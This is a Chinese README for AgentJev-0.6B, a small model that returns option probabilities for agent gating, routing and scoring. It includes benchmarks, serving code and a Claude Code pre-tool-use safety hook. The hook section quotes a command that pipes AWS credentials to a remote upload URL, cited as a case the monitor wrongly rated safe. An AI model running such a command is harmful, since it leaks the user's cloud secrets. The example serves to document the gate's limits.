<p align="center">
  <img src="assets/hero.webp" alt="AgentJev。状态进去，分布出来，不解码任何 token。2,000 道决策上 top-1 为 79.25%，解码 token 为 0，上下文 2,048，三种决策原语。" width="100%">
</p>

<p align="center">
  <a href="README.md"><img alt="English" src="https://img.shields.io/badge/lang-English-111111?style=flat-square"></a>
  <a href="LICENSE"><img alt="Apache-2.0" src="https://img.shields.io/badge/license-Apache_2.0-111111?style=flat-square"></a>
  <a href="https://huggingface.co/aimeigaoshou/agent-jev"><img alt="Hugging Face 权重" src="https://img.shields.io/badge/weights-Hugging_Face-C6A36A?style=flat-square"></a>
  <a href="https://huggingface.co/Qwen/Qwen3-0.6B"><img alt="Qwen3-0.6B" src="https://img.shields.io/badge/backbone-Qwen3--0.6B-111111?style=flat-square"></a>
  <a href="https://huggingface.co/datasets/LocalLLaMA/typed-decisions"><img alt="Typed Decisions" src="https://img.shields.io/badge/eval-Typed_Decisions-111111?style=flat-square"></a>
  <img alt="解码 token 为 0" src="https://img.shields.io/badge/decoded_tokens-0-C6A36A?style=flat-square">
</p>

<p align="center">
  权重：<a href="https://huggingface.co/aimeigaoshou/agent-jev">https://huggingface.co/aimeigaoshou/agent-jev</a>
  &nbsp;·&nbsp; 官网：<a href="https://malevrigns.github.io/agent-jev/">https://malevrigns.github.io/agent-jev/</a>
</p>

<p align="center">
  <a href="#它做什么">它做什么</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#三种原语">原语</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#一次前向">一次前向</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#typed-decisions">结果</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#时延与吞吐">时延</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#跑起来">跑起来</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#http">HTTP</a>
  &nbsp;&nbsp;·&nbsp;&nbsp;
  <a href="#仓库">仓库</a>
</p>

AgentJev-0.6B 不写句子。你给它一段状态，和已经写好的问题。一次前向返回每个选项的概率。解码出的 token 数是 0。

它适合放在 Agent 循环里做门控、路由和评分。解释错误、改代码、起草回复，仍然交给更大的模型。

<p align="center">
  <a href="https://malevrigns.github.io/agent-jev/#demo"><img src="assets/agentjev_demo.webp" alt="演示视频片段：README 的“23 tests passed, 1 failed.”例子，v1 与 coding-gates 新权重的判断，接着是 Claude Code 钩子。" width="100%"></a>
  <br>
  <sub><b><a href="https://malevrigns.github.io/agent-jev/#demo">▶ 观看 82 秒演示视频</a></b> · <a href="docs/media/agentjev-demo.mp4">MP4，1920×1080，8.9 MB</a> · 配原创轻音乐，无旁白；中英字幕已烧进画面，静音也看得懂。画面里的概率和耗时都是同一块 RTX 5060 上的实测。</sub>
</p>

---

## 它做什么

写代码的 Agent、分派工单的机器人、工作流引擎，大部分步骤其实不是写作题。测试过了没有。下一步调哪个工具。这条命令能不能执行。常见做法是让 27B–70B 的模型把一个布尔值说成一段话，再去解析这段话。

| | 拿写作者当开关 | AgentJev |
| --- | --- | --- |
| 输出 | 你希望它是 JSON 的文本 | 你给定选项上的分布 |
| 解码 | 一个 token 接一个 token | 没有 |
| 失败方式 | 格式坏了，或者一句很确定的空话 | 一个可以设阈值的概率 |
| 在循环里的位置 | 占掉一整轮 | 写作者脚下的那一下反射 |

<p align="center">
  <img src="assets/agentjev_reflex_demo.gif" alt="同一段状态上，AgentJev 直接给出分布，对照逐 token 把决定写出来的模型。" width="100%">
  <br>
  <sub>状态保持非结构化。问题是有类型的。答案是分布。</sub>
</p>

状态可以是 diff、堆栈、工单线程或一张表。对象会按稳定 JSON 送进去。问题的 id 只用来对上响应，不会进入模型。含义必须写在问题和选项正文里。

---

## 三种原语

三种形状。每一种都返回完整分布，不只返回胜出的那一项。

| | Boolean | Choice | Score |
| --- | --- | --- | --- |
| 问的是 | 一个命题 | 就这些选项而言，选哪一个 | 落在这条有序量尺的哪里 |
| 你传入 | 可选的 true / false 准则 | 2–255 个选项，每项一段描述，列表或映射都可以 | 2–10 级描述，从低到高 |
| 你拿回 | `value`、为真的概率、两侧质量 | `value`、`top_probability`、`margin`、完整分布 | `level`（最大概率的下标），`score` = Σ i · Pᵢ |

`margin` 是第一名和第二名的差。Choice 是给定集合内部的相对偏好，不是这个动作独立的成功概率。若要后者，对每个动作单独问一个 Boolean，再用你自己的结果做校准。

---

## 一次前向

骨干是去掉语言模型头的 Qwen3-0.6B。每个候选项读它最后一个 token 的隐状态。一个与排列等变的小头再给整组打分：选项的书写顺序不会偷偷变成名次。Softmax 按问题做。

```mermaid
flowchart LR
  state["状态"] --> enc["Qwen3-0.6B"]
  questions["Boolean · Choice · Score"] --> enc
  enc --> head["候选头"]
  head --> dist["分布"]
```

三件事是实现，不是口号。

**没有解码。** 隐状态直接变成 logits。没有输出词表这一步，也就没有待修补的 JSON。

**上下文 2,048 tokens。超长会拒绝，不会静默截断。** 装不下的 diff 或堆栈是一次错误，不会悄悄切掉问题或某个候选项。

**一个状态只为它的所有问题编码一次。** 每个候选仍是一条独立的因果路径 `[状态][问题][候选]`。服务端把同一状态的路径合并成一棵 token 前缀树，一次前向编码完；每个 token 只关注自己和祖先，位置取它在原路径中的深度，所以候选读不到兄弟候选，也读不到别的问题。在 400 个测试案例上（1 段状态 5 道题，每案一次请求，RTX 5060），每案骨干计算的 token 从 **4,074** 降到 **443**，单案中位时延从 **278.01 ms** 降到 **43.89 ms**。准确率、软交叉熵和 Brier 不变；2,000 道题里 1,998 道选中的选项与独立路径一致，变了的两道原本就是相差不超过 0.0031 的平局。概率最大绝对差 **0.0053**。两边生成的 token 都是 0。这是这份负载、这块显卡上的测量，不是对所有输入的承诺；完整表格见[时延与吞吐](#时延与吞吐)。

<p align="center">
  <img src="assets/agentjev_shared_prefix.gif" alt="共享前缀：状态只编码一次，多个候选项从同一前缀分出。" width="100%">
  <br>
  <sub>状态编码一次。候选项从这条前缀上分出去。</sub>
</p>

`--encoder question` 恢复此前的路由：只在同一问题有至少 8 个候选时复用 KV 前缀。训练支持 `encoder_impl: tree`：`TreeEncoder` 合并同一问题内相同的 token 前缀，只允许节点关注自身和祖先，按路径深度设置位置编码，并通过共享节点反向传播。CPU collate 预先构建树结构；自动选择分段因果 SDPA、有预算限制的稠密掩码或短批次的独立路径。问题大小不均衡时，会在能同时减少补齐和掩码开销的情况下打包成紧凑的森林。兼容现有路径批次和检查点，默认仍为 `path`，要求使用 eager 或 SDPA 的全注意力 Qwen3。上面的耗时来自服务端；训练编码器的独立结果、数值误差、显存和复现命令见 [TreeEncoder benchmark 报告](outputs/tree_benchmark_report.md)。

---

## Typed Decisions

[Typed Decisions](https://huggingface.co/datasets/LocalLLaMA/typed-decisions) 官方测试集：**400 个案例，2,000 道题**。每个案例一段状态、五道题，四个工作流。准确率是和公开教师分布的最大概率项是否一致，不是 Coding Agent 的真实成功率。

| 模型 | 性质 | Top-1 | 软交叉熵 ↓ | Brier ↓ | ECE ↓ | 等级误差 ↓ |
| --- | --- | ---: | ---: | ---: | ---: | ---: |
| **AgentJev-0.6B，本轮** | 专用模型 | **79.25%** · 1585/2000 | **0.8494** | **0.0448** | 0.1687 | **0.2096** |
| Laya 已发布权重 | 专用模型 | 77.00% · 1540/2000 | 0.8844 | 0.0615 | 0.2170 | 0.2423 |
| TypeSafe Jev 1.13.0 | 通用模型，零样本 | 72.7% | — | 0.148 | 0.144 | 0.391 |
| ModernBERT-base，149M | 专用模型 | 64.6% | — | 0.119 | 0.179 | 0.444 |
| MiniLM-L6，22M | 专用模型 | 58.7% | — | 0.143 | 0.108 | 0.515 |
| AgentJev phase 4，本轮之前 | 专用模型 | 38.70% · 774/2000 | 1.2817 | 0.2577 | 0.1050 | 0.7062 |
| 标签频率 Prior | 参照 | 47.0% | — | 0.189 | 0.088 | — |
| 均匀分布 | 参照 | 30.8% | — | 0.238 | 0.169 | — |

没有软交叉熵的几行，抄自数据集卡片，本仓库没有重测。那张卡片也不公布软交叉熵。这几行的 Brier、ECE、等级误差沿用卡片自己的定义。

相对 Laya，这份测试集上的准确率差是 **+2.25 个百分点**。按 400 个案例做 bootstrap，95% 区间 **[+0.65, +3.90]**。相对本轮的起点 phase 4，差距是 **+40.55 个百分点**，区间 **[+37.35, +43.50]**。

<p align="center">
  <img src="assets/agentjev_laya_accuracy.gif" alt="AgentJev 比 Laya 多答对 45 题，发票多 25 题，客服多 29 题。" width="100%">
  <br>
  <sub>差距按题数计。合计 1,585 对 1,540。发票 431 对 406。客服 411 对 382。</sub>
</p>

### 按工作流

每个工作流 500 题。AgentJev 用的是校准后的权重。Laya 与上表是同一个已发布专用权重。

| 工作流 | AgentJev | Laya |
| --- | ---: | ---: |
| 发票处理 | **86.20%** | 81.20% |
| 客户服务 | **82.20%** | 76.40% |
| 安全事件 | 76.80% | **77.60%** |
| Agent 轨迹观测 | 71.80% | **72.80%** |

### 按原语

| 原语 | 题数 | Top-1 | 软交叉熵 |
| --- | ---: | ---: | ---: |
| Boolean | 600 | 88.83% | 0.4935 |
| Choice | 600 | 75.33% | 0.9767 |
| Score | 800 | 75.00% | 1.0209 |

### 这张表怎么读

专用模型和通用模型不是同一种测量。数据集卡片写了这一点，表里也标了。Jev 1.13.0 是零样本答这些题。AgentJev、Laya、ModernBERT、MiniLM 都在这个基准上拟合过。

Laya 已发布权重用了全部 1,200 个官方训练案例。本轮留出 120 个开发案例和 120 个校准案例，按开发集软交叉熵选出第 600 步，**然后**才打开测试集。温度是每种原语一个正标量，只在校准集上拟合。损失是软交叉熵加上 0.1 倍的候选求和 Brier。种子 `20260921`。数据版本 `ea9306458d6e9563628369a3d1e72e362fb381d2`。

标签是教师分布，里面有合成案例。在这里赢下一行，不等于拉取请求合并了、事件被遏制了、或者发票付出去了。

完整数字：[`typed_decisions/comparison.json`](typed_decisions/comparison.json)、[`typed_decisions/protocol.json`](typed_decisions/protocol.json)、[`typed_decisions/REPORT_zh.md`](typed_decisions/REPORT_zh.md)。

---

## 编码门控

Typed Decisions 里没有测试运行器的输出，可本 README 自己的例子问的正是这个：测试通过了吗？[`coding_gates/`](coding_gates/) 补上了这一块：2,100 次真实运行，覆盖 pytest、unittest、jest、mocha、vitest 和 node --test，每个项目的结果在构建时就已确定；另有 1,800 条一行摘要。在它的测试集上，v1 把 **348 个失败案例中的 123 个判成了通过**，其中 115 个是一行摘要，就像本 README 自己的例子。

候选模型在这个训练集上继续训练 v1，同时回放 Typed Decisions，并改写问法：

| | v1 | 候选 |
| --- | ---: | ---: |
| 测试集：失败案例被判通过 | 123 / 348 | **0 / 348** |
| 没训练过的运行器（vitest、node --test）：失败运行被判通过 | 31 / 198 | **7 / 198** |
| 没训练过的运行器：通过的运行被拦下 | 1 / 102 | 8 / 102 |
| 五种没训练过的问法，测试集门控准确率 | 78.4% | **95.6%** |
| Typed Decisions 测试集 top-1 | 79.50% | **80.85%** |

两者走同一个推理引擎，温度都只在 Typed Decisions 校准集上拟合，每个留出集都只读了一次。以 BF16 发布文件为基准，Typed Decisions 提升 +1.35 个百分点，95% 置信区间 +0.20 到 +2.50。候选模型在极简问法和 node 的 `dot` 报告器上较弱，还会拦下一个输出 `[no test files]`、实际已通过的 `go test ./...`。这些局限、每个划分的数字，以及被放弃的第一次尝试，见 [`coding_gates/README.md`](coding_gates/README.md)。候选权重已发布在模型仓库的 [`coding-gates`](https://huggingface.co/aimeigaoshou/agent-jev/tree/coding-gates) 分支，默认仍是 v1：

```bash
python fetch_v1_weights.py --variant coding-gates     # models/agentjev-coding-gates, pinned and hash-checked
python -m jev_service.server --checkpoint models/agentjev-coding-gates/model.safetensors \
    --model-path models/agentjev-coding-gates --temperatures models/agentjev-coding-gates/temperatures.json --port 8149
```

---

## 时延与吞吐

一块 RTX 5060（8 GB），PyTorch 2.9.1+cu128，Transformers 4.57.6，v1 权重加校准温度。每个测试案例一次请求，计时包含分词。优化前是 `main` 的 `1c2c1b1`，优化后是默认的 `--encoder auto`，两者用 `python -m jev_service.benchmark_serving` 先后连续测量。

| 负载条件 | 优化前 | 优化后 | 变化 |
|---|---:|---:|---|
| **测试集单案 P50**（1 段状态 5 道题） | 278.01 ms | **43.89 ms** | 快 6.3 倍 |
| **测试集单案 P90** | 378.22 ms | **48.00 ms** | 快 7.9 倍 |
| **吞吐**（每请求 20 案） | 3.68 案/秒 | **27.39 案/秒** | 7.4 倍 |
| **多候选重负载**（64 个 Choice + 1 个 Boolean，33,547 个路径 token） | 550.74 ms | **136.88 ms** | 快 4.0 倍；骨干 token 2,551 → 1,521 |
| **每案骨干 token** | 4,074 | **443** | 状态只读一遍，不再每个候选读一遍 |
| **常驻权重显存** | 2,283 MiB | **1,443 MiB** | 骨干 Linear 权重存为 BF16，输出逐位不变 |

这台机器上两次测量之间的波动约 10%：未改动的 `--encoder path` 第一次中位数 282.0 ms，第二次 310.9 ms，优化后一列来自第二次。

Laya 发布的检查点在原基准机器上测得单案 P50 **41.53 ms**、P90 **47.14 ms**，没有在这块显卡上重测，所以上表不是与 Laya 的同机对比。Laya 的上下文上限是 1,024 tokens，AgentJev 是 2,048。Laya 的 ModernBERT 是双向编码器，没有因果前缀缝隙：宽负载里 64 个候选每个都要对状态完整前向一次，AgentJev 每个请求只读一遍状态。

<p align="center">
  <img src="assets/agentjev_laya_wide.gif" alt="AgentJev 在 298.91 毫秒到达终点，Laya 大约还在 500 到 600 毫秒这一档的半路上。" width="100%">
  <br>
  <sub>此前在原机器上的宽负载对比，用的是按问题 KV 复用（298.91 ms）。现在默认改为按状态共享。</sub>
</p>

---

## 跑起来

v1 发版是[不可变 v1 修订版](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1)上的 safetensors 状态字典，连同训练时用的 Qwen3-0.6B-Base 配置和分词器。这个 git 仓库是代码。安装依赖前，请先用 [PyTorch 官方选择器](https://pytorch.org/get-started/locally/)装好适合本机硬件的 PyTorch；`requirements.txt` 要求 `torch>=2.0.0`。

```bash
git clone https://github.com/malevrigns/agent-jev.git
cd agent-jev
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\Activate.ps1
pip install -r requirements.txt
pip install huggingface_hub safetensors
python fetch_v1_weights.py
```

`fetch_v1_weights.py` 固定修订版 `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`，校验全部 7 个发版文件（权重、校准温度、配置和分词器）的字节数与 SHA-256，从文件头确认 343 个张量都是 bfloat16，然后放进 `models/agentjev-v1`。别的什么都不下载：总共约 1.2 GB。以前的快速开始还要多下 1.5 GB 的 Qwen3 底座模型，下完又被整个覆盖掉。脚本会把准备好的命令打印出来：

```bash
python -m jev_service.server \
  --checkpoint models/agentjev-v1/model.safetensors \
  --model-path models/agentjev-v1 \
  --temperatures models/agentjev-v1/temperatures.json \
  --port 8149
```

`model.safetensors` 是完整模块：骨干加上候选头。它不是因果语言模型，`AutoModelForCausalLM` 加载不了。服务按 `config.json` 搭出 Qwen3 骨架，不读取、也不初始化任何底座权重，再用 `load_state_dict(..., strict=True)` 填满。以前快速开始生成的 `agentjev_v1.pt` 加 `--model-path models/Qwen3-0.6B` 仍然能加载，打分完全一致。加载时用 `dtype=torch.bfloat16`：在固定的修订版上 343 个张量全部是 bfloat16，1,196,881,242 字节对应 598,418,689 个参数。精度是跟着修订版走的——仓库默认分支现在提供的是另一个 checkpoint，float32、体积翻倍——所以快速开始下载的是固定修订版，而不是默认分支。

进程只绑 **127.0.0.1**。报告就绪之前会先跑一个预热请求，第一个真实请求不用再付约 1 秒的 CUDA 初始化。工作台在 [http://127.0.0.1:8149/](http://127.0.0.1:8149/)。`GET /health` 和 `GET /api/info` 返回当前加载的权重及其 SHA-256；直接加载发版文件时，就是 Hugging Face 上列出的那个哈希。上表对应的是第 600 步选出的 checkpoint。这次公开的张量就是那一轮。

`--temperatures` 传入在留出校准集上拟合的标量。`--page` 替换工作台页面。`--port` 默认 8149，与客户端和钩子一致。`--device` 默认 `cuda:0`。`--max-tokens` 默认 2048。`--encoder` 默认 `auto`，同一状态的所有问题只编码一次状态；`question` 保留此前按问题路由的行为。

---

## 客户端

`agentjev_client.py` 对这个服务说话。除标准库外没有额外依赖。

```python
from agentjev_client import AgentJev

jev = AgentJev("http://127.0.0.1:8149")

state = {
    "task": "修复 UserAuthService.verifyToken 的空指针",
    "test_output": "Tests run: 14, Failures: 1 — test_expired_token",
}

gate = jev.decide_boolean(
    state,
    "测试是否已经全部通过？",
    criteria={
        "true": "测试全绿，并且项目可以构建。",
        "false": "仍有失败的测试。",
    },
)

route = jev.decide_choice(
    state,
    "Agent 下一步应该做什么？",
    options={
        "read_failed_test": "打开 test_expired_token，读断言。",
        "rewrite_file": "让更大的模型重写这个服务。",
        "commit": "不管失败，提交当前 diff。",
        "retry": "不改代码，把测试再跑一遍。",
    },
)

risk = jev.score(
    state,
    "这次改动的运行风险在哪一级？",
    levels=[
        "隔离修改，没有外部行为变化。",
        "一条单元断言挪动了。",
        "公开签名变了。",
        "鉴权行为可能被绕过。",
    ],
)
```

`gate` 里有 `decision`、`prob_true`、`prob_false`、`confidence`、`wall_ms`。
`route` 里有 `best_action`、`probability`、`margin`、`distribution`。
`risk` 里有 `level` 和 `expected_score`。

同一段状态要问好几题时，用 `evaluate(state, questions)`。多段状态放在 HTTP 体的 `requests` 里，最多 32 段。

下面三个脚本假定 8149 上已经有服务：

```bash
python run_practical_test.py
python test_coding_scenarios.py
python test_game_suite.py
```

前两个走软件工程场景。第三个走客服、迷宫、贪吃蛇和 ViZDoom 形态的决策。它们是对着活服务的演示，不是离线单测。

---

## HTTP

`POST /api/evaluate`

```json
{
  "state": "23 个测试通过，1 个失败。",
  "questions": [
    {
      "id": "done",
      "type": "boolean",
      "question": "测试是否已经全部通过？",
      "criteria": {
        "true": "测试全绿。",
        "false": "至少有一个测试失败。"
      }
    },
    {
      "id": "next",
      "type": "choice",
      "question": "下一步做什么更有用？",
      "options": {
        "debug_failure": "读失败的断言。",
        "submit_patch": "现在就开拉取请求。"
      }
    }
  ]
}
```

```json
{
  "api_version": "agentjev.decision.v1",
  "results": [
    {
      "id": "0",
      "answers": [
        {
          "id": "done",
          "type": "boolean",
          "probability": 0.08,
          "value": false,
          "distribution": { "true": 0.08, "false": 0.92 }
        },
        {
          "id": "next",
          "type": "choice",
          "value": "debug_failure",
          "top_probability": 0.87,
          "margin": 0.74,
          "distribution": { "debug_failure": 0.87, "submit_patch": 0.13 }
        }
      ]
    }
  ],
  "usage": { "generated_tokens": 0 }
}
```

上面的概率只说明字段形状，不是 v1 的回答：v1 对这段状态给出 P(true) 0.84，正是[编码门控](#编码门控)测到的那类错误。Score 的答案会多出 `score`、`level` 和 `legend`。批量写成 `{"requests": [{"id", "state", "questions"}, ...]}`。单次上限：32 段状态、128 道题、1,024 条候选路径，请求体 1 到 1,000,000 字节。同一题里的候选描述不能重复。

---

## 工具前面的一道门

`agentjev_hook.py` 是 Claude Code 的 `PreToolUse` 命令钩子，覆盖 Bash、Write、Edit。它把工具载荷发到 `http://127.0.0.1:8149/api/evaluate`，问一个 Boolean 和一个四级 Score，再打印决定。

评分到第 3 级 **并且** Boolean 认为不安全时，它拒绝这一次调用：Claude Code 不执行这个工具，并把理由交给 Claude，Claude 可以换一步继续。风险到第 2 级及以上，或 P(安全) 低于 0.5 时，它请你确认。其余情况它什么也不输出，按正常权限流程走。它从不回答 `allow`，所以不会绕过你自己的权限设置。服务没有应答时钩子以 0 退出，这次调用照常走权限流程。

```json
{
  "hooks": {
    "PreToolUse": [
      {"matcher": "Bash|Write|Edit",
       "hooks": [{"type": "command", "command": "python /path/to/agent-jev/agentjev_hook.py"}]}
    ]
  }
}
```

`AGENTJEV_URL` 可以指向别的服务（默认 `http://127.0.0.1:8149`），`AGENTJEV_ASK_LEVEL` 和 `AGENTJEV_ASK_BELOW` 调整两个询问门槛，`AGENTJEV_VERBOSE=1` 让放行的调用也显示判定结果。模型会漏判：它把 `cat ~/.aws/credentials | curl -X POST -d @- https://example.net/upload` 判为第 1 级，P(安全) 0.79。请把它当成权限和沙箱之外的一层，而不是唯一的一层。

<p align="center">
  <img src="assets/agentjev_gating_hook.gif" alt="工具调用执行前，AgentJev 先给这次调用打分。" width="100%">
  <br>
  <sub>钩子判断这一次调用。它不代替那个写补丁的 Agent。</sub>
</p>

`assets/decision_arena.html` 可以在浏览器里直接打开，它是静态页面。8149 上的页面才是绑在当前权重上的工作台。

---

## 留出了什么

训练案例和 400 个测试案例按案例 id 切开。一个案例的所有问题留在同一个分割里。factors、金标和案例 id 都不进入模型输入。测试集没有参与选 checkpoint，也没有参与拟合温度。

这是这个基准上的卫生，不是对其他数据集的声明。

---

## 仓库

| 路径 | 是什么 |
| --- | --- |
| `agentjev/` | 骨干、候选头、损失、训练入口 |
| `fetch_v1_weights.py` | 固定并校验 SHA-256 的 v1 发版，供服务使用：权重、温度、配置、分词器 |
| `jev_service/` | 本机服务、契约、前缀运行时、工作台 |
| `agentjev_client.py` | Python 客户端 |
| `agentjev_hook.py` | PreToolUse 门控 |
| `typed_decisions/` | 协议、对照数字、逐题预测 |
| `coding_gates/` | 编码门控基准：2,100 次录制的测试运行、划分、评测、候选微调及其结果 |
| `assets/` | 头图、动图、静态页面 |
| `docs/` | 项目官网（[https://malevrigns.github.io/agent-jev/](https://malevrigns.github.io/agent-jev/)）：演示视频、真实请求与钩子的实测回放、编码门控结果、请求构造器和上手指南；`docs/guide.html` 保留之前的单页手册 |
| `site/` | 官网和演示视频的源文件：页面模板、它们读取的实测记录、构建和渲染脚本（见 [`site/README.md`](site/README.md)） |
| `run_practical_test.py`、`test_coding_scenarios.py`、`test_game_suite.py` | 对着活服务的演示 |

服务侧容易漏掉的说明在 [`jev_service/README.md`](jev_service/README.md)。

---

## 引用

```bibtex
@misc{agentjev2026,
  title        = {AgentJev: A 0.6B System One Decision Model},
  author       = {malevrigns},
  year         = {2026},
  howpublished = {\url{https://github.com/malevrigns/agent-jev}},
  license      = {Apache-2.0}
}
```

## 社区

- [Linux.Do](https://linux.do/) — 本项目非常认可 LinuxDo 社区！

Apache-2.0。见 [LICENSE](LICENSE)。
